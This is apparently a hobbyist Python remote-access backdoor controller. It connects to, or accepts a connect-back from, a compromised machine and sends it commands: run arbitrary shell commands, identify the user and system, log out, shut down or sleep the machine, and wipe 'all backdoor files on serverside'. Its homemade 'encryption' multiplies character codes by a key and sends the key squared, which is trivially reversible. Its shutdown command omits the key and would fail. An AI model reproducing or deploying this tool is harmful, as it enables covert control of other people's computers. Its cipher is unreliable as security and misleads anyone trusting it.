#FOR PYTHON 3
__version__ = '0.2'
import socket, random, cmd, argparse

# Things I learned:
# add connect back feature
# argparse and command line flagging
# os.system command line
# SO_REUSEADDR
# do_while
# platform.uname()

#The encryption algorithm takes a random number and multiplies all of
#the charachter's ASCII values by it. It gets the key to the other side
#by sending it squared.

def encode_with_key(string, key):#Encrypting and decrypting
    list_of_numbers = ''
    for letter in string:
        list_of_numbers += str(ord(letter)*key) + ' '
    return list_of_numbers.encode()
def decode_with_key(byte, key):
    string_of_bytes = ''
    list_of_bytes = byte.decode('utf-8').split()
    for b in list_of_bytes:
        string_of_bytes += chr(int(int(b)//key))
    return string_of_bytes

class send_commands(cmd.Cmd):
    prompt = 'Enter command: '
    def cmdloop(self, key, client, system):
        self.key = key
        self.client = client
        self.system = system
        intro = None
        return cmd.Cmd.cmdloop(self, intro)
    def do_exit(self, arg):
        'Exit program.'
        message = encode_with_key('exit', self.key)
        lenofmsg = str(len(str(message)))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        return True
    def do_loggedin(self, arg):
        'Get current logged in user.'
        message = encode_with_key('loggedin', self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('lenofmsg', lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        lenofmsg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(lenofmsg), self.key)))
    def do_WHOAMI(self, arg):
        'Get current logged in user.'
        message = encode_with_key('WHOAMI', self.key)
        lenofmsg = str(len(str(message)))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('lenofmsg', lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        lenofmsg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(lenofmsg), self.key)))
    def do_volume(self, arg):
        'Set volume.'
        if self.system == 'Darwin':
            message = encode_with_key('volume '+str(arg), self.key)
            lenofmsg = str(len(str(message)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('lenofmsg', lenofmsg)
            self.client.send(str(lenofmsg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_say(self, arg):
        'Announce a phrase on the server.'
        if self.system == 'Darwin':
            message = encode_with_key('say '+str(arg), self.key)
            lenofmsg = str(len(str(message)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('lenofmsg', lenofmsg)
            self.client.send(str(lenofmsg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_logout(self, arg):
        'Logout the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin':
            message = encode_with_key('logout', self.key)
            lenofmsg = str(len(str(message)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('lenofmsg', lenofmsg)
            self.client.send(str(lenofmsg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_shutdown(self, arg):
        'Shutdown the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin':
            message = encode_with_key('shutdown')
            lenofmsg = str(len(str(message)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('lenofmsg', lenofmsg)
            self.client.send(str(lenofmsg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_sleep(self, arg):
        'Sleep the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin' or self.system == 'Linux':
            message = encode_with_key('sleep', self.key)
            lenofmsg = str(len(str(message)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('lenofmsg', lenofmsg)
            self.client.send(str(lenofmsg).encode())
            self.client.send(message)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_cmd(self, arg):
        'Run a command on the server.'
        message = encode_with_key('cmd '+str(arg), self.key)
        lenofmsg = str(len(str(message)))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('lenofmsg', lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        lenofmsg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(lenofmsg), self.key)))
    def do_system(self, arg):
        'Get the server kernel os.'
        message = encode_with_key('system', self.key)
        lenofmsg = str(len(str(message)))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('lenofmsg', lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        lenofmsg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(lenofmsg), self.key)))
    def do_uname(self, arg):
        'Get machine info: node, platform, processor, system version, and other info.'
        message = encode_with_key('uname '+str(arg), self.key)
        lenofmsg = str(len(str(message)))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('lenofmsg', lenofmsg)
        self.client.send(str(lenofmsg).encode())
        self.client.send(message)
        lenofmsg = int(self.client.recv(5).decode('utf-8'))
        print(str(decode_with_key(self.client.recv(lenofmsg), self.key)))
    def do_killattack(self, arg):
        'Erase all backdoor files on serverside.'
        print('Are you sure you want to erase all backdoor files on the serverside?')
        erase = input('There is no going back. Write y or n. ')
        if erase == 'y':
            message = encode_with_key('killattack', self.key)
            lenofmsg = str(len(str(message)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('lenofmsg', lenofmsg)
            self.client.send(str(lenofmsg).encode())
            self.client.send(message)
            return True

def main():
    #key = b'9657019238925365'#Defining key
    #Setting up argparse
    runmode = argparse.ArgumentParser(description='Get runmode')
    runmode.add_argument('-a', '--active', action='store_true')
    runmode.add_argument('-p', '--passive', action='store_true')
    runmode.add_argument('-c', '--command', action='store_true')
    mode = vars(runmode.parse_args())#Turns into dict
    print(mode)

    #Setting up socket
    if mode['active'] == True and mode['passive'] == True:
        print('Not a valid input')
        raise SystemExit
    elif mode['passive'] == True:
        connect = socket.socket()
        ip = '127.0.0.1'
        #ip = '192.168.7.226'
        port = 6000
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
        connect.bind((ip, port))
        connect.listen(1)
        client, addr = connect.accept()
        print('accepted')
    else:
        client = socket.socket()
        ip = '127.0.0.1'
        port = 6000
        try:
            client.connect((ip, port))
        except Exception as e:
            print('Connection Failed: {}'.format(e))
            raise SystemExit

    key = random.randrange(0, 2**12)#Picking encryption key
    print('key', key)
    lenofmsg = str(len(str(key**2).encode()))
    lenofmsg = ('0' * (2-len(lenofmsg))) + str(lenofmsg)
    client.send(str(lenofmsg).encode())
    client.send(str(key**2).encode())#Multiplying key for security
    lenofmsg = int(client.recv(2).decode('utf-8'))
    system = str(client.recv(lenofmsg).decode('utf-8'))
    print('You are connecting to a computer running the {kernel} operating system.'.format(kernel = system))
    commands = send_commands()
    commands.cmdloop(key, client, system)
    client.close()

if __name__ == '__main__':
    main()
